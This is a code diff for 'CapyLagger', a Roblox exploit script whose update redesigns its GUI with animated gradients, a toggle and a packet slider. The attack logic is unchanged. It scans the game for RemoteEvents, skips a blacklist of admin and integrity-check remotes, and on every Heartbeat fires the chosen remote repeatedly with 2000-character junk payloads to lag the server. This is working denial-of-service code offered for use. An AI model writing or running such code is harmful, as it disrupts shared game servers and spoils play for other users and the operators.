@@ -1,13 +1,14 @@
--- Services
+-- // SERVICES //
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
 
 local LocalPlayer = Players.LocalPlayer
 
--- === ПОЛНЫЙ BLACKLIST (ЭТИ РЕМОУТЫ ИГНОРИРУЮТСЯ) ===
--- Если скрипт найдет только их, он напишет, что сервер не поддерживается.
+-- // BLACKLIST & SETTINGS //
 local blacklistedNames = {
     "PlaceCooldownFromChat", "AdminPanelService", "AdminPanel",
     "IntegrityCheckProcessor", "LocalizationTableAnalyticsSender",
@@ -42,12 +43,10 @@ local blacklistedNames = {
     "RE/TeleportService/Reconnect"
 }
 
--- Приоритетные цели (если найдет их — подключится сразу)
 local priorityTargets = {
     "WhyAreTheyTargetingMe!!", "FisherMan", "Chat", "AFK", "CookiesService"
 }
 
--- === НАСТРОЙКИ ===
 local Settings = {
     LagEnabled = false,
     PacketsPerSecond = 5,
@@ -55,284 +54,343 @@ local Settings = {
 }
 
 local TargetRemote = nil
-local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
+local uuid = HttpService:GenerateGUID(false)
 
--- === UI ИНТЕРФЕЙС ===
-if game.CoreGui:FindFirstChild("WerzzMenuV2") then
-    game.CoreGui.WerzzMenuV2:Destroy()
-elseif LocalPlayer.PlayerGui:FindFirstChild("WerzzMenuV2") then
-    LocalPlayer.PlayerGui.WerzzMenuV2:Destroy()
-end
+-- // UI LIBRARY //
+local UI = {}
 
-local GuiConfig = {
-    Size = UDim2.new(0, 230, 0, 180), 
-    Transparency = 0.1,
-    CornerSize = 12,
-    Colors = {
-        Bg = Color3.fromRGB(20, 15, 15),
-        Accent = Color3.fromRGB(255, 140, 60),
-        ButtonDark = Color3.fromRGB(30, 25, 25),
-        TextWhite = Color3.fromRGB(240, 240, 240),
-        TextDim = Color3.fromRGB(180, 180, 180),
-        SliderTrack = Color3.fromRGB(40, 35, 35),
-        Green = Color3.fromRGB(80, 255, 120),
-        Red = Color3.fromRGB(255, 80, 80)
-    }
-}
-
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "WerzzMenuV2"
-ScreenGui.ResetOnSpawn = false
-if pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end) then else ScreenGui.Parent = LocalPlayer.PlayerGui end
-
-local MainFrame = Instance.new("Frame")
-MainFrame.Name = "Main"
-MainFrame.Size = GuiConfig.Size
-MainFrame.Position = UDim2.new(0.5, -GuiConfig.Size.X.Offset/2, 0.4, 0)
-MainFrame.BackgroundColor3 = GuiConfig.Colors.Bg
-MainFrame.BackgroundTransparency = GuiConfig.Transparency
-MainFrame.BorderSizePixel = 0
-MainFrame.Parent = ScreenGui
-
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, GuiConfig.CornerSize)
-UICorner.Parent = MainFrame
-
-local UIStroke = Instance.new("UIStroke")
-UIStroke.Color = GuiConfig.Colors.Accent
-UIStroke.Thickness = 1
-UIStroke.Transparency = 0.2
-UIStroke.Parent = MainFrame
-
--- Header
-local Header = Instance.new("TextLabel")
-Header.Size = UDim2.new(1, 0, 0, 30)
-Header.Position = UDim2.new(0, 0, 0, 10)
-Header.BackgroundTransparency = 1
-Header.Text = "CapyLagger"
-Header.TextColor3 = GuiConfig.Colors.Accent
-Header.Font = Enum.Font.GothamBold
-Header.TextSize = 14
-Header.Parent = MainFrame
-
--- Status Label
-local StatusLabel = Instance.new("TextLabel")
-StatusLabel.Size = UDim2.new(1, 0, 0, 15)
-StatusLabel.Position = UDim2.new(0, 0, 0, 35)
-StatusLabel.BackgroundTransparency = 1
-StatusLabel.Text = "Checking Support..."
-StatusLabel.TextColor3 = GuiConfig.Colors.TextDim
-StatusLabel.Font = Enum.Font.Gotham
-StatusLabel.TextSize = 11
-StatusLabel.Parent = MainFrame
-
--- Helper Function
-local function createButton(name, text, yPos, height, widthScale, xOffset)
-    local Btn = Instance.new("TextButton")
-    Btn.Name = name
-    Btn.Size = UDim2.new(widthScale, -20, 0, height)
-    if widthScale == 1 then
-        Btn.Position = UDim2.new(0, 10, 0, yPos)
-    else
-        Btn.Position = UDim2.new(0, xOffset, 0, yPos)
+function UI:Create(class, properties)
+    local instance = Instance.new(class)
+    for k, v in pairs(properties) do
+        instance[k] = v
     end
-    Btn.BackgroundColor3 = GuiConfig.Colors.ButtonDark
-    Btn.BackgroundTransparency = 0
-    Btn.Text = text
-    Btn.TextColor3 = GuiConfig.Colors.TextWhite
-    Btn.Font = Enum.Font.GothamMedium
-    Btn.TextSize = 13
-    Btn.AutoButtonColor = true
-    Btn.Parent = MainFrame
-    local Corner = Instance.new("UICorner")
-    Corner.CornerRadius = UDim.new(0, 8)
-    Corner.Parent = Btn
-    return Btn
+    return instance
 end
 
-local BtnLag = createButton("Lag", "Lag: Off", 65, 35, 1, 0)
+function UI:Tween(instance, properties, duration, style)
+    TweenService:Create(instance, TweenInfo.new(duration or 0.3, style or Enum.EasingStyle.Quint), properties):Play()
+end
+
+function UI:Gradient(parent)
+    local gradient = UI:Create("UIGradient", {
+        Parent = parent,
+        Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 128)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 50, 255)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
+        })
+    })
+    
+    -- Анимация вращения градиента
+    task.spawn(function()
+        local rotation = 0
+        while gradient.Parent do
+            rotation = rotation + 1
+            if rotation > 360 then rotation = 0 end
+            gradient.Rotation = rotation
+            RunService.RenderStepped:Wait()
+        end
+    end)
+    return gradient
+end
+
+-- // MAIN GUI SETUP //
+if CoreGui:FindFirstChild("CapyLaggerUI") then CoreGui.CapyLaggerUI:Destroy() end
+
+local ScreenGui = UI:Create("ScreenGui", {
+    Name = "CapyLaggerUI",
+    Parent = CoreGui,
+    ResetOnSpawn = false
+})
+
+-- Main Container
+local MainFrame = UI:Create("Frame", {
+    Parent = ScreenGui,
+    Size = UDim2.new(0, 260, 0, 300),
+    Position = UDim2.new(0.5, -130, 0.4, 0),
+    BackgroundColor3 = Color3.fromRGB(15, 15, 20),
+    BorderSizePixel = 0,
+    BackgroundTransparency = 0.05
+})
+UI:Create("UICorner", {Parent = MainFrame, CornerRadius = UDim.new(0, 16)})
+
+-- RGB Stroke (Border)
+local MainStroke = UI:Create("UIStroke", {
+    Parent = MainFrame,
+    Thickness = 2,
+    Transparency = 0
+})
+UI:Gradient(MainStroke) -- Apply RGB
+
+-- Top Bar
+local TopBar = UI:Create("Frame", {
+    Parent = MainFrame,
+    Size = UDim2.new(1, 0, 0, 40),
+    BackgroundTransparency = 1
+})
+local Title = UI:Create("TextLabel", {
+    Parent = TopBar,
+    Size = UDim2.new(1, 0, 1, 0),
+    Text = "CapyLagger",
+    Font = Enum.Font.GothamBold,
+    TextSize = 22,
+    TextColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundTransparency = 1
+})
+-- Gradient Text
+local TitleGradient = UI:Create("UIGradient", {
+    Parent = Title,
+    Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 150, 0)), -- Capybara Orange
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 220, 100))
+    })
+})
+
+-- Content Area
+local Content = UI:Create("Frame", {
+    Parent = MainFrame,
+    Size = UDim2.new(1, -30, 1, -50),
+    Position = UDim2.new(0, 15, 0, 45),
+    BackgroundTransparency = 1
+})
+
+-- Status Panel
+local StatusPanel = UI:Create("Frame", {
+    Parent = Content,
+    Size = UDim2.new(1, 0, 0, 35),
+    BackgroundColor3 = Color3.fromRGB(25, 25, 30)
+})
+UI:Create("UICorner", {Parent = StatusPanel, CornerRadius = UDim.new(0, 8)})
+
+local StatusDot = UI:Create("Frame", {
+    Parent = StatusPanel,
+    Size = UDim2.new(0, 8, 0, 8),
+    Position = UDim2.new(0, 12, 0.5, -4),
+    BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+})
+UI:Create("UICorner", {Parent = StatusDot, CornerRadius = UDim.new(1, 0)})
+
+local StatusText = UI:Create("TextLabel", {
+    Parent = StatusPanel,
+    Size = UDim2.new(1, -30, 1, 0),
+    Position = UDim2.new(0, 30, 0, 0),
+    Text = "Scanning Protocols...",
+    Font = Enum.Font.Gotham,
+    TextSize = 12,
+    TextColor3 = Color3.fromRGB(180, 180, 180),
+    BackgroundTransparency = 1,
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+
+-- Big Button
+local ToggleBtn = UI:Create("TextButton", {
+    Parent = Content,
+    Size = UDim2.new(1, 0, 0, 80),
+    Position = UDim2.new(0, 0, 0, 50),
+    BackgroundColor3 = Color3.fromRGB(30, 30, 35),
+    Text = "",
+    AutoButtonColor = false
+})
+UI:Create("UICorner", {Parent = ToggleBtn, CornerRadius = UDim.new(0, 12)})
+local BtnGradient = UI:Create("UIGradient", {
+    Parent = ToggleBtn,
+    Color = ColorSequence.new(Color3.fromRGB(30,30,35)),
+    Enabled = true
+})
+
+local Icon = UI:Create("ImageLabel", {
+    Parent = ToggleBtn,
+    Size = UDim2.new(0, 40, 0, 40),
+    Position = UDim2.new(0.5, -20, 0.5, -20),
+    Image = "rbxassetid://6031068421", -- Power Icon
+    ImageColor3 = Color3.fromRGB(100, 100, 100),
+    BackgroundTransparency = 1
+})
 
 -- Slider
-local SliderLabel = Instance.new("TextLabel")
-SliderLabel.Text = "Packets: " .. Settings.PacketsPerSecond
-SliderLabel.Size = UDim2.new(1, -20, 0, 20)
-SliderLabel.Position = UDim2.new(0, 10, 0, 110)
-SliderLabel.BackgroundTransparency = 1
-SliderLabel.TextColor3 = GuiConfig.Colors.TextWhite
-SliderLabel.Font = Enum.Font.Gotham
-SliderLabel.TextSize = 11
-SliderLabel.TextXAlignment = Enum.TextXAlignment.Left
-SliderLabel.Parent = MainFrame
+local SliderPanel = UI:Create("Frame", {
+    Parent = Content,
+    Size = UDim2.new(1, 0, 0, 50),
+    Position = UDim2.new(0, 0, 0, 145),
+    BackgroundTransparency = 1
+})
+local SliderTitle = UI:Create("TextLabel", {
+    Parent = SliderPanel,
+    Text = "Packet Intensity",
+    Size = UDim2.new(1, 0, 0, 20),
+    TextColor3 = Color3.fromRGB(200, 200, 200),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamMedium,
+    TextSize = 12,
+    TextXAlignment = Enum.TextXAlignment.Left
+})
+local SliderValue = UI:Create("TextLabel", {
+    Parent = SliderPanel,
+    Text = "5",
+    Size = UDim2.new(1, 0, 0, 20),
+    TextColor3 = Color3.fromRGB(255, 170, 0),
+    BackgroundTransparency = 1,
+    Font = Enum.Font.GothamBold,
+    TextSize = 12,
+    TextXAlignment = Enum.TextXAlignment.Right
+})
+local SliderTrack = UI:Create("TextButton", {
+    Parent = SliderPanel,
+    Size = UDim2.new(1, 0, 0, 6),
+    Position = UDim2.new(0, 0, 0, 30),
+    BackgroundColor3 = Color3.fromRGB(40, 40, 45),
+    Text = "",
+    AutoButtonColor = false
+})
+UI:Create("UICorner", {Parent = SliderTrack, CornerRadius = UDim.new(1, 0)})
+local SliderFill = UI:Create("Frame", {
+    Parent = SliderTrack,
+    Size = UDim2.new(0.05, 0, 1, 0),
+    BackgroundColor3 = Color3.fromRGB(255, 150, 0)
+})
+UI:Create("UICorner", {Parent = SliderFill, CornerRadius = UDim.new(1, 0)})
 
-local SliderTrack = Instance.new("TextButton")
-SliderTrack.Text = ""
-SliderTrack.AutoButtonColor = false
-SliderTrack.Size = UDim2.new(1, -20, 0, 4)
-SliderTrack.Position = UDim2.new(0, 10, 0, 135)
-SliderTrack.BackgroundColor3 = GuiConfig.Colors.SliderTrack
-SliderTrack.BorderSizePixel = 0
-SliderTrack.Parent = MainFrame
-local TrackCorner = Instance.new("UICorner")
-TrackCorner.CornerRadius = UDim.new(1, 0)
-TrackCorner.Parent = SliderTrack
+-- Footer
+local Footer = UI:Create("TextLabel", {
+    Parent = MainFrame,
+    Size = UDim2.new(1, 0, 0, 20),
+    Position = UDim2.new(0, 0, 1, -25),
+    Text = "CapyLagger v2.0 - Stable",
+    Font = Enum.Font.Gotham,
+    TextSize = 10,
+    TextColor3 = Color3.fromRGB(100, 100, 100),
+    BackgroundTransparency = 1
+})
 
-local SliderKnob = Instance.new("Frame")
-SliderKnob.Size = UDim2.new(0, 14, 0, 14)
-SliderKnob.AnchorPoint = Vector2.new(0.5, 0.5)
-SliderKnob.Position = UDim2.new(0, 0, 0.5, 0)
-SliderKnob.BackgroundColor3 = Color3.fromRGB(255, 200, 150)
-SliderKnob.Parent = SliderTrack
-local KnobCorner = Instance.new("UICorner")
-KnobCorner.CornerRadius = UDim.new(1, 0)
-KnobCorner.Parent = SliderKnob
+-- // LOGIC FUNCTIONS //
 
-local Footer = Instance.new("TextLabel")
-Footer.Size = UDim2.new(1, 0, 0, 20)
-Footer.Position = UDim2.new(0, 0, 1, -20)
-Footer.BackgroundTransparency = 1
-Footer.Text = "ez skid lura.ph"
-Footer.TextColor3 = GuiConfig.Colors.TextDim
-Footer.TextTransparency = 0.5
-Footer.Font = Enum.Font.Gotham
-Footer.TextSize = 10
-Footer.Parent = MainFrame
-
--- === ЛОГИКА UI ===
-local isDraggingSlider = false
-local function updateSlider(input)
-    local pos = input.Position.X
-    local trackAbsPos = SliderTrack.AbsolutePosition.X
-    local trackAbsSize = SliderTrack.AbsoluteSize.X
-    local percent = math.clamp((pos - trackAbsPos) / trackAbsSize, 0, 1)
-    SliderKnob.Position = UDim2.new(percent, 0, 0.5, 0)
-    local value = math.max(1, math.floor(percent * Settings.MaxPackets))
-    Settings.PacketsPerSecond = value
-    SliderLabel.Text = "Packets: " .. tostring(value)
-end
-
-SliderTrack.MouseButton1Down:Connect(function() isDraggingSlider = true end)
-UserInputService.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then isDraggingSlider = false end
-end)
-UserInputService.InputChanged:Connect(function(input)
-    if isDraggingSlider and input.UserInputType == Enum.UserInputType.MouseMovement then updateSlider(input) end
-end)
-
-local function updateButtonVisual(button, state, prefix)
+local function UpdateButtonVisuals(state)
     if state then
-        button.BackgroundColor3 = GuiConfig.Colors.Accent
-        button.Text = prefix .. ": On"
-        button.TextColor3 = Color3.new(1,1,1)
+        -- ON State
+        UI:Tween(ToggleBtn, {BackgroundColor3 = Color3.fromRGB(255, 255, 255)})
+        BtnGradient.Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 50)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 50, 50))
+        })
+        UI:Tween(Icon, {ImageColor3 = Color3.fromRGB(255, 255, 255)})
+        
+        -- Pulse Effect
+        task.spawn(function()
+            while Settings.LagEnabled do
+                UI:Tween(ToggleBtn, {Size = UDim2.new(1, -4, 0, 76), Position = UDim2.new(0, 2, 0, 52)}, 0.5)
+                task.wait(0.5)
+                if not Settings.LagEnabled then break end
+                UI:Tween(ToggleBtn, {Size = UDim2.new(1, 0, 0, 80), Position = UDim2.new(0, 0, 0, 50)}, 0.5)
+                task.wait(0.5)
+            end
+            -- Reset
+            UI:Tween(ToggleBtn, {Size = UDim2.new(1, 0, 0, 80), Position = UDim2.new(0, 0, 0, 50)}, 0.2)
+        end)
     else
-        button.BackgroundColor3 = GuiConfig.Colors.ButtonDark
-        button.Text = prefix .. ": Off"
-        button.TextColor3 = GuiConfig.Colors.TextWhite
+        -- OFF State
+        UI:Tween(ToggleBtn, {BackgroundColor3 = Color3.fromRGB(30, 30, 35)})
+        BtnGradient.Color = ColorSequence.new(Color3.fromRGB(30, 30, 35))
+        UI:Tween(Icon, {ImageColor3 = Color3.fromRGB(100, 100, 100)})
     end
 end
 
-BtnLag.MouseButton1Click:Connect(function()
-    if not TargetRemote then return end -- Если Remote нет, кнопка не работает
+ToggleBtn.MouseButton1Click:Connect(function()
+    if not TargetRemote then return end
     Settings.LagEnabled = not Settings.LagEnabled
-    updateButtonVisual(BtnLag, Settings.LagEnabled, "Lag")
+    UpdateButtonVisuals(Settings.LagEnabled)
+    
     if Settings.LagEnabled then
-        StatusLabel.Text = "Status: Sending Packets..."
-        StatusLabel.TextColor3 = GuiConfig.Colors.Accent
+        StatusText.Text = "Sending Heavy Packets..."
+        StatusText.TextColor3 = Color3.fromRGB(255, 100, 100)
+        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
     else
-        StatusLabel.Text = "Status: Idle"
-        StatusLabel.TextColor3 = GuiConfig.Colors.Green
+        StatusText.Text = "Connected: " .. TargetRemote.Name
+        StatusText.TextColor3 = Color3.fromRGB(0, 255, 150)
+        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(0, 255, 150)})
     end
 end)
 
--- === СКАНЕР (ПРОВЕРКА НА BLACKLIST) ===
-local function findTarget()
-    local foundRemotes = {}
-    
-    -- Сканируем все RemoteEvent в игре
+-- Slider Logic
+local dragging = false
+SliderTrack.MouseButton1Down:Connect(function() dragging = true end)
+UserInputService.InputEnded:Connect(function(input) 
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end 
+end)
+
+RunService.RenderStepped:Connect(function()
+    if dragging then
+        local mPos = UserInputService:GetMouseLocation().X
+        local rPos = mPos - SliderTrack.AbsolutePosition.X
+        local perc = math.clamp(rPos / SliderTrack.AbsoluteSize.X, 0, 1)
+        SliderFill.Size = UDim2.new(perc, 0, 1, 0)
+        local val = math.max(1, math.floor(perc * Settings.MaxPackets))
+        Settings.PacketsPerSecond = val
+        SliderValue.Text = tostring(val)
+    end
+end)
+
+-- // SCANNER //
+local function Scan()
+    local found = nil
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") then
-            local fullName = v:GetFullName()
-            local remoteName = v.Name
-            local isBlacklisted = false
-            
-            -- Проверяем, есть ли имя в твоем списке "Не поддерживается"
-            for _, blacklisted in ipairs(blacklistedNames) do
-                -- plain=true нужен, чтобы символы типа "/" читались как текст, а не код
-                if string.find(fullName, blacklisted, 1, true) or string.find(remoteName, blacklisted, 1, true) then
-                    isBlacklisted = true
-                    break
+            local name = v.Name
+            local bad = false
+            for _, b in pairs(blacklistedNames) do
+                if string.find(v:GetFullName(), b, 1, true) or string.find(name, b, 1, true) then
+                    bad = true; break
                 end
             end
-            
-            -- Если не в черном списке - это валидный Remote
-            if not isBlacklisted then
-                -- Если в приоритете - берем сразу
-                for _, priority in ipairs(priorityTargets) do
-                    if string.find(remoteName, priority, 1, true) then
-                        return v
-                    end
-                end
-                table.insert(foundRemotes, v)
+            if not bad then
+                found = v
+                break
             end
         end
     end
     
-    -- Берем первый найденный валидный ремоут
-    if #foundRemotes > 0 then return foundRemotes[1] end
-    return nil
+    TargetRemote = found
+    
+    if TargetRemote then
+        StatusText.Text = "Connected: " .. TargetRemote.Name
+        StatusText.TextColor3 = Color3.fromRGB(0, 255, 150)
+        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(0, 255, 150)})
+    else
+        StatusText.Text = "Failed: Not Supported"
+        StatusText.TextColor3 = Color3.fromRGB(255, 50, 50)
+        UI:Tween(StatusDot, {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
+        ToggleBtn.AutoButtonColor = false
+        Icon.ImageTransparency = 0.8
+    end
 end
 
-TargetRemote = findTarget()
-
--- ПРОВЕРКА РЕЗУЛЬТАТА
-if TargetRemote then
-    -- Нашли рабочий ремоут (не из черного списка)
-    StatusLabel.Text = "Connected: " .. TargetRemote.Name
-    StatusLabel.TextColor3 = GuiConfig.Colors.Green
-else
-    -- Нашли ТОЛЬКО ремоуты из черного списка или вообще ничего
-    StatusLabel.Text = "Failed: Not Supported"
-    StatusLabel.TextColor3 = GuiConfig.Colors.Red
-    BtnLag.Text = "Not Supported"
-    BtnLag.AutoButtonColor = false
-    BtnLag.BackgroundColor3 = Color3.fromRGB(50, 20, 20)
-end
-
--- === LAGGER LOOP (С МГНОВЕННЫМ ВЫКЛЮЧЕНИЕМ) ===
+-- // LAG LOGIC (INSTANT STOP) //
 RunService.Heartbeat:Connect(function()
     if not Settings.LagEnabled or not TargetRemote then return end
-
-    local payload = string.rep("X", 2000)
     
+    local payload = string.rep("X", 2000)
     for i = 1, Settings.PacketsPerSecond do
-        -- ГЛАВНАЯ ФИШКА: Если выключили кнопку, цикл прерывается СРАЗУ
-        if not Settings.LagEnabled then break end
-        
+        if not Settings.LagEnabled then break end -- Instant Break
         pcall(function() TargetRemote:FireServer(uuid, payload) end)
     end
 end)
 
--- === DRAG ===
-local dragging, dragInput, dragStart, startPos
-local function updateDrag(input)
-    local delta = input.Position - dragStart
-    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-end
+-- // DRAGGING GUI //
+local dragStart, startPos
+local isDraggingGUI = false
 MainFrame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        dragging = true
-        dragStart = input.Position
-        startPos = MainFrame.Position
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then dragging = false end
-        end)
-    end
-end)
-MainFrame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        isDraggingGUI = true; dragStart = input.Position; startPos = MainFrame.Position
     end
 end)
 UserInputService.InputChanged:Connect(function(input)
-    if input == dragInput and dragging then updateDrag(input) end
+    if isDraggingGUI and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+UserInputService.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then isDraggingGUI = false end
 end)
 
+-- Init
+Scan()
